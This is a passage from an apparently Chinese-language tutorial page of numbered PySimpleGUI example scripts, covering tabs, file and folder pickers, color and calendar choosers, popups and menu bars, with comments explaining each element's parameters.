layout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event, values = window.read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> event == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;确定&#x27;</span>:</span><br><span class="line">        window[<span class="string">&#x27;-a-&#x27;</span>].update(visible=<span class="literal">False</span>)</span><br><span class="line">        window[<span class="string">&#x27;-b-&#x27;</span>].update(visible=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="31标签元素的讲解及练习-py"><a href="#31标签元素的讲解及练习-py" class="headerlink" title="31标签元素的讲解及练习.py"></a>31标签元素的讲解及练习.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">什么是标签元素：</span></span><br><span class="line"><span class="string">一种容器元素，里面可以放置各种元素及布局。优点在于切界更为便捷。书写方式与别的元素稍有不同。</span></span><br><span class="line"><span class="string">书写方式：</span></span><br><span class="line"><span class="string">sg.TabGroup([[sg.Tab(&#x27;Tab1&#x27;,tab1_layout,),sg.Tab(&#x27;Tab2&#x27;,tab2_layout,)]],)</span></span><br><span class="line"><span class="string">单个标签可设定的属性</span></span><br><span class="line"><span class="string">            background_color=&#x27;black&#x27;,  # 背景色</span></span><br><span class="line"><span class="string">            relief=None,  # 浮雕设计&#x27;raised&#x27;, &#x27;sunken&#x27;, &#x27;flat&#x27;, &#x27;ridge&#x27;, &#x27;solid&#x27;, &#x27;groove&#x27;,</span></span><br><span class="line"><span class="string">            disabled=False, # 禁用状态设定</span></span><br><span class="line"><span class="string">            pad=None, # 和周围元素间的间隔（（左右）（上下））</span></span><br><span class="line"><span class="string">            font=None, # 可以设置字体名称，大小等。</span></span><br><span class="line"><span class="string">            border_width=10, # 框架元素的线条宽度</span></span><br><span class="line"><span class="string">            tooltip=None, # 悬浮文本</span></span><br><span class="line"><span class="string">            right_click_menu=None, # 右击调出菜单</span></span><br><span class="line"><span class="string">            key=None, # 元素的唯一标识符</span></span><br><span class="line"><span class="string">            visible=True,   # 元素可见状态设定</span></span><br><span class="line"><span class="string">            element_justification=&quot;center&quot;, # 列内所有元素的对齐方式，有效值为left,center,right</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">整个标签元素可设定的属性</span></span><br><span class="line"><span class="string">layout, # 标签组内的tab布局，注意sg.Tab()要写在第一行</span></span><br><span class="line"><span class="string">tab_location=None, # 标签标题所处位置，有效值有12个，分别为left,right,top,bottom,lefttop,leftbuttom,</span></span><br><span class="line"><span class="string">                    righttop,rightbottom,bottomleft,bottomright,topleft,topright</span></span><br><span class="line"><span class="string">title_color=None, # 标题文本颜色（未选中时）</span></span><br><span class="line"><span class="string">tab_background_color=None, # 所有标签背景颜色（未选中时）</span></span><br><span class="line"><span class="string">selected_title_color=None, # 选中时标题文本颜色</span></span><br><span class="line"><span class="string">selected_background_color=None, # 选中时标签背景颜色（未选中时）</span></span><br><span class="line"><span class="string">background_color=None,  # 标签标题所在空白区域的背景色</span></span><br><span class="line"><span class="string">pad=None, # 和周围元素间的间隔（（左右）（上下））</span></span><br><span class="line"><span class="string">font=None, # 可以设置字体名称，大小等。</span></span><br><span class="line"><span class="string">enable_events=False, # 元素的事件属性，切换标签元素就会发生事件</span></span><br><span class="line"><span class="string">border_width=10, # 边界线宽度</span></span><br><span class="line"><span class="string">tooltip=None, # 悬浮文本</span></span><br><span class="line"><span class="string">right_click_menu=None, # 右击调出菜单</span></span><br><span class="line"><span class="string">key=None, # 元素的唯一标识符</span></span><br><span class="line"><span class="string">visible=True,   # 元素可见状态设定</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">可更新的属性</span></span><br><span class="line"><span class="string">title=None, # 标签标题文本的更新</span></span><br><span class="line"><span class="string">disabled=None, # 禁用状态更新</span></span><br><span class="line"><span class="string">visible=None, # 可见状态更新</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line">lista=[<span class="string">&#x27;苹果&#x27;</span>,<span class="string">&#x27;香蕉&#x27;</span>,<span class="string">&#x27;雪梨&#x27;</span>,<span class="string">&#x27;西瓜&#x27;</span>]</span><br><span class="line">listb=[<span class="string">&#x27;白菜&#x27;</span>,<span class="string">&#x27;芥菜&#x27;</span>,<span class="string">&#x27;包菜&#x27;</span>,<span class="string">&#x27;生菜&#x27;</span>]</span><br><span class="line">tab1_layout=[[sg.LB(lista,size=(<span class="number">50</span>,<span class="number">5</span>))]]</span><br><span class="line">tab2_layout=[[sg.LB(listb,size=(<span class="number">50</span>,<span class="number">5</span>))]]</span><br><span class="line">layout=[[sg.TabGroup([[sg.Tab(<span class="string">&#x27;水果类&#x27;</span>,tab1_layout),sg.Tab(<span class="string">&#x27;蔬菜类&#x27;</span>,tab2_layout)]])]]</span><br><span class="line">window = sg.Window(<span class="string">&#x27;Python GUI&#x27;</span>, layout,keep_on_top=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">result=<span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event, values = window.read()</span><br><span class="line">    <span class="built_in">print</span>(event)</span><br><span class="line">    <span class="keyword">if</span> event == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="32编写一个文件选择器-py"><a href="#32编写一个文件选择器-py" class="headerlink" title="32编写一个文件选择器.py"></a>32编写一个文件选择器.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">可设定的属性</span></span><br><span class="line"><span class="string">button_text=&quot;Browse&quot;, # 按钮元素上要显示的文本</span></span><br><span class="line"><span class="string">target=key, # 显示路径的目标元素的key</span></span><br><span class="line"><span class="string">file_types=((&#x27;ALL Files&#x27;,&#x27;*.png&#x27;),), # 只显示指定的文件类型 ‘*.pdf’ # 只显示指定的文件名称 ‘text.*’</span></span><br><span class="line"><span class="string">initial_folder=None, # 默认路径设定</span></span><br><span class="line"><span class="string">tooltip=None, # str:悬浮文本</span></span><br><span class="line"><span class="string">size=(None,None) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line"></span><br><span class="line">layout=[</span><br><span class="line">    [sg.FilesBrowse(button_text=<span class="string">&quot;选择文件&quot;</span>,target=<span class="string">&#x27;-a-&#x27;</span>,file_types=((<span class="string">&#x27;ALL Files&#x27;</span>,<span class="string">&#x27;*.png&#x27;</span>),),initial_folder=<span class="string">r&quot;c:\\&quot;</span>), \</span><br><span class="line">    sg.In(key=<span class="string">&#x27;-IN-&#x27;</span>),sg.In(key=<span class="string">&#x27;-a-&#x27;</span>)]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">window = sg.Window(<span class="string">&#x27;Python GUI&#x27;</span>, layout,keep_on_top=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event, values = window.read()</span><br><span class="line">    <span class="built_in">print</span>(event)</span><br><span class="line">    <span class="keyword">if</span> event == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="33文件夹选择器与文件另存为-py"><a href="#33文件夹选择器与文件另存为-py" class="headerlink" title="33文件夹选择器与文件另存为.py"></a>33文件夹选择器与文件另存为.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">文件夹选择器的书写方法：</span></span><br><span class="line"><span class="string">sg.FolderBrowse()</span></span><br><span class="line"><span class="string">文件另存为的书写方法：</span></span><br><span class="line"><span class="string">sg.FileSaveAs()</span></span><br><span class="line"><span class="string">主要属性</span></span><br><span class="line"><span class="string">button_text=&quot;Save As...&quot;, # 按键文本</span></span><br><span class="line"><span class="string">target=key, # 指定显示的元素</span></span><br><span class="line"><span class="string">file_types=((&#x27;ALL Files&#x27;,&#x27;*.*&#x27;),),  # 设定文件名和文件类型(文件夹选择器没有)</span></span><br><span class="line"><span class="string">initial_folder=None, # 设定默认路径</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line"></span><br><span class="line">layout=[</span><br><span class="line">    [sg.FilesBrowse(button_text=<span class="string">&quot;选择文件&quot;</span>),sg.In()],</span><br><span class="line">    [sg.FolderBrowse(button_text=<span class="string">&quot;选择文件夹&quot;</span>,target=<span class="string">&#x27;1&#x27;</span>),sg.In(key=<span class="string">&#x27;1&#x27;</span>),sg.In(),],</span><br><span class="line">    [sg.FileSaveAs(button_text=<span class="string">&quot;另存为&quot;</span>,target=<span class="string">&#x27;2&#x27;</span>),sg.In(),sg.In(key=<span class="string">&#x27;2&#x27;</span>),sg.In()]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">window = sg.Window(<span class="string">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event, values = window.read()</span><br><span class="line">    <span class="built_in">print</span>(event)</span><br><span class="line">    <span class="keyword">if</span> event == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="34颜色选择器和日历选择器-py"><a href="#34颜色选择器和日历选择器-py" class="headerlink" title="34颜色选择器和日历选择器.py"></a>34颜色选择器和日历选择器.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">颜色选择器的属性</span></span><br><span class="line"><span class="string">button_text, 按钮元素要显示的文本</span></span><br><span class="line"><span class="string">target=key, 显示颜色码的目标元素的key</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">日历选择器</span></span><br><span class="line"><span class="string">button_text, 按钮上显示的文本</span></span><br><span class="line"><span class="string">target=(key), 选择的日期要显示的位置</span></span><br><span class="line"><span class="string">close_when_date_chosen=True, 选择日期后，日历界面关闭</span></span><br><span class="line"><span class="string">default_date_m_d_y=(None,None,None), 默认值设定</span></span><br><span class="line"><span class="string">locale=None, 区域设定，西班牙：es</span></span><br><span class="line"><span class="string">format=&quot;%Y-%m-%d %H:%M:%S&quot;, 显示的格式</span></span><br><span class="line"><span class="string">begin_at_sunday_plus=0, 指定日历显示的第一列</span></span><br><span class="line"><span class="string">month_names=month, 指定月份的文本列表</span></span><br><span class="line"><span class="string">day_abbreviations=week, # 指定周几的文本列表</span></span><br><span class="line"><span class="string">title=&quot;Choose Date&quot;, 选择窗口的标题</span></span><br><span class="line"><span class="string">no_titlebar=True, 不显示标题</span></span><br><span class="line"><span class="string">location=(None,None), 日历窗口的位置</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line">month=[<span class="string">&#x27;1月&#x27;</span>,<span class="string">&#x27;2月&#x27;</span>,<span class="string">&#x27;3月&#x27;</span>,<span class="string">&#x27;4月&#x27;</span>,<span class="string">&#x27;5月&#x27;</span>,<span class="string">&#x27;6月&#x27;</span>,<span class="string">&#x27;7月&#x27;</span>,<span class="string">&#x27;8月&#x27;</span>,<span class="string">&#x27;9月&#x27;</span>,<span class="string">&#x27;10月&#x27;</span>,<span class="string">&#x27;11月&#x27;</span>,<span class="string">&#x27;12月&#x27;</span>]</span><br><span class="line">week=[<span class="string">&#x27;周日&#x27;</span>,<span class="string">&#x27;周一&#x27;</span>,<span class="string">&#x27;周二&#x27;</span>,<span class="string">&#x27;周三&#x27;</span>,<span class="string">&#x27;周四&#x27;</span>,<span class="string">&#x27;周五&#x27;</span>,<span class="string">&#x27;周六&#x27;</span>]</span><br><span class="line"></span><br><span class="line">layout=[</span><br><span class="line">    [sg.ColorChooserButton(button_text=<span class="string">&quot;颜色选择器&quot;</span>),sg.In()],</span><br><span class="line">    [sg.CalendarButton(button_text=<span class="string">&quot;日历选择器&quot;</span>),sg.In()]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">window = sg.Window(<span class="string">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event, values = window.read()</span><br><span class="line">    <span class="built_in">print</span>(event)</span><br><span class="line">    <span class="keyword">if</span> event == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="35关于弹窗的各种设定-py"><a href="#35关于弹窗的各种设定-py" class="headerlink" title="35关于弹窗的各种设定.py"></a>35关于弹窗的各种设定.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line"></span><br><span class="line">a=sg.Popup(<span class="string">&#x27;程序员无声&#x27;</span>,<span class="string">&#x27;程序员小胖&#x27;</span>*<span class="number">5</span>,</span><br><span class="line">         title=<span class="string">&#x27;弹窗演示&#x27;</span>, <span class="comment"># 弹窗标题，如果未设定，则默认显示可变参数的第一个文本作为标题</span></span><br><span class="line">         button_color=(<span class="string">&#x27;red&#x27;</span>,<span class="string">&#x27;black&#x27;</span>), <span class="comment"># # 文本颜色，背景颜色</span></span><br><span class="line">         background_color=<span class="string">&#x27;black&#x27;</span>, <span class="comment"># 弹窗的背景颜色</span></span><br><span class="line">         text_color=<span class="string">&#x27;red&#x27;</span>, <span class="comment"># 弹窗上面的文本颜色</span></span><br><span class="line">         auto_close=<span class="literal">False</span>, <span class="comment"># 如果设定为True，弹窗会自动关闭界面</span></span><br><span class="line">         auto_close_duration=<span class="literal">None</span>, <span class="comment"># 自动关闭窗口之前界面持续的时间（以秒为单位）</span></span><br><span class="line">         custom_text=(<span class="string">&#x27;yes&#x27;</span>,<span class="string">&#x27;no&#x27;</span>), <span class="comment"># 自定义按钮上要显示的文本，可以设定一个或者两个</span></span><br><span class="line">         non_blocking=<span class="literal">False</span>, <span class="comment"># 非阻塞设定，如果为True，立即执行下一步，不需要等待用户的输入</span></span><br><span class="line">         font=<span class="literal">None</span>, <span class="comment"># 字体大小，名称设定</span></span><br><span class="line">         no_titlebar=<span class="literal">False</span>, <span class="comment"># 不显示标题栏</span></span><br><span class="line">         grab_anywhere=<span class="literal">False</span>, <span class="comment"># 如果为True, 拖动界面进行移动</span></span><br><span class="line">         keep_on_top=<span class="literal">False</span>, <span class="comment"># 如果为True， 保持界面在屏幕的最前方</span></span><br><span class="line">         location=(<span class="literal">None</span>,<span class="literal">None</span>), <span class="comment"># 界面出现的位置</span></span><br><span class="line">         any_key_closes=<span class="literal">False</span>, <span class="comment"># 如果为True，敲打任意键盘就会关闭页面，如果为False，只用X关闭按钮，用户选择，以及回车键才会关闭窗口</span></span><br><span class="line">         image=<span class="literal">None</span>, <span class="comment"># 显示图片（支持base64）</span></span><br><span class="line">         modal=<span class="literal">True</span>, <span class="comment"># 模态窗口设定，除非关闭此窗口否则其他界面不能进行操作</span></span><br><span class="line"></span><br><span class="line">         )</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>

<h1 id="36弹窗之PopupGetText-py"><a href="#36弹窗之PopupGetText-py" class="headerlink" title="36弹窗之PopupGetText.py"></a>36弹窗之PopupGetText.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line">pwd=<span class="string">&#x27;123&#x27;</span></span><br><span class="line"><span class="built_in">list</span>=[<span class="string">&#x27;python学习资料&#x27;</span>,<span class="string">&#x27;java学习资料&#x27;</span>,<span class="string">&#x27;php学习资料&#x27;</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    result = sg.PopupGetText(<span class="string">&#x27;密码输入框&#x27;</span>, password_char=<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> result == pwd:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> result == <span class="literal">None</span>:</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sg.Popup(<span class="string">&#x27;输入有误&#x27;</span>)</span><br><span class="line"></span><br><span class="line">layout=[</span><br><span class="line">    [sg.LB(<span class="built_in">list</span>,size=(<span class="number">30</span>,<span class="number">5</span>))],</span><br><span class="line">]</span><br><span class="line">window = sg.Window(<span class="string">&#x27;资料查询&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event, values = window.read()</span><br><span class="line">    <span class="built_in">print</span>(event)</span><br><span class="line">    <span class="keyword">if</span> event == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="37各种不同特征的弹窗-py"><a href="#37各种不同特征的弹窗-py" class="headerlink" title="37各种不同特征的弹窗.py"></a>37各种不同特征的弹窗.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">文件选择弹窗</span></span><br><span class="line"><span class="string">sg.PopupGetFile() or sg.Popup_get_file()</span></span><br><span class="line"><span class="string">文件夹选择器</span></span><br><span class="line"><span class="string">sg.PopupGetFolder() or sg.popup_get_folder()</span></span><br><span class="line"><span class="string">没有标题栏的弹窗，可以随意移动窗口</span></span><br><span class="line"><span class="string">sg.PopupAnnoying()</span></span><br><span class="line"><span class="string">显示一段时间后自动关闭窗口</span></span><br><span class="line"><span class="string">sg.PopupAutoClose()</span></span><br><span class="line"><span class="string">含有一个Cancelled的按钮</span></span><br><span class="line"><span class="string">sg.PopupCancel()</span></span><br><span class="line"><span class="string">弹窗含有ok和cancel两个按钮</span></span><br><span class="line"><span class="string">sg.PopupOKCancel()</span></span><br><span class="line"><span class="string">含有一个带颜色的Error按钮</span></span><br><span class="line"><span class="string">sg.PopupError()</span></span><br><span class="line"><span class="string">显示无按钮的弹窗</span></span><br><span class="line"><span class="string">sg.PopupNoButtons()</span></span><br><span class="line"><span class="string">显示弹出窗口并立即返回</span></span><br><span class="line"><span class="string">sg.PopupNoWait()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line">result=sg.PopupAnnoying(<span class="string">&#x27;演示弹窗&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<h1 id="38菜单栏的设定方法-py"><a href="#38菜单栏的设定方法-py" class="headerlink" title="38菜单栏的设定方法.py"></a>38菜单栏的设定方法.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line">menu=[</span><br><span class="line">    [<span class="string">&#x27;文件(&amp;F)&#x27;</span>,[<span class="string">&#x27;新建&#x27;</span>,<span class="string">&#x27;打开&#x27;</span>,<span class="string">&#x27;!保存&#x27;</span>,<span class="string">&#x27;---&#x27;</span>,<span class="string">&#x27;退出&#x27;</span>]],</span><br><span class="line">    [<span class="string">&#x27;编辑&#x27;</span>,[<span class="string">&#x27;撤销&#x27;</span>,<span class="string">&#x27;重做&#x27;</span>,<span class="string">&#x27;剪切&#x27;</span>,<span class="string">&#x27;保存&#x27;</span>]],</span><br><span class="line">    [<span class="string">&#x27;帮助&#x27;</span>,[<span class="string">&#x27;检查更新&#x27;</span>,<span class="string">&#x27;使用指南&#x27;</span>,<span class="string">&#x27;关于&#x27;</span>]]</span><br><span class="line">]</span><br><span class="line">layout=[</span><br><span class="line">    [sg.Menu(menu)],</span><br><span class="line">    [[sg.In()] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">]</span><br><span class="line">window = sg.Window(<span class="string">&#x27;菜单演示&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event, values = window.read()</span><br><span class="line">    <span class="built_in">print</span>(event)</span><br><span class="line">    <span class="keyword">if</span> event == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="39菜单栏的重点补充-py"><a href="#39菜单栏的重点补充-py" class="headerlink" title="39菜单栏的重点补充.py"></a>39菜单栏的重点补充.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line">menu=[</span><br><span class="line">    [<span class="string">&#x27;文件(&amp;F)&#x27;</span>,[<span class="string">&#x27;新建&#x27;</span>,<span class="string">&#x27;打开::open&#x27;</span>,<span class="string">&#x27;!保存&#x27;</span>,<span class="string">&#x27;---&#x27;</span>,<span class="string">&#x27;退出&#x27;</span>]],</span><br><span class="line">    [<span class="string">&#x27;编辑&#x27;</span>,[<span class="string">&#x27;撤销&#x27;</span>,<span class="string">&#x27;重做&#x27;</span>,<span class="string">&#x27;剪切&#x27;</span>,<span class="string">&#x27;保存&#x27;</span>]],</span><br><span class="line">    [<span class="string">&#x27;帮助&#x27;</span>,[<span class="string">&#x27;检查更新&#x27;</span>,<span class="string">&#x27;使用指南&#x27;</span>,<span class="string">&#x27;关于&#x27;</span>]]</span><br><span class="line">]</span><br><span class="line">layout=[</span><br><span class="line">    [sg.Menu(menu,key=<span class="string">&#x27;-a-&#x27;</span>,tearoff=<span class="literal">True</span>)],</span><br><span class="line">    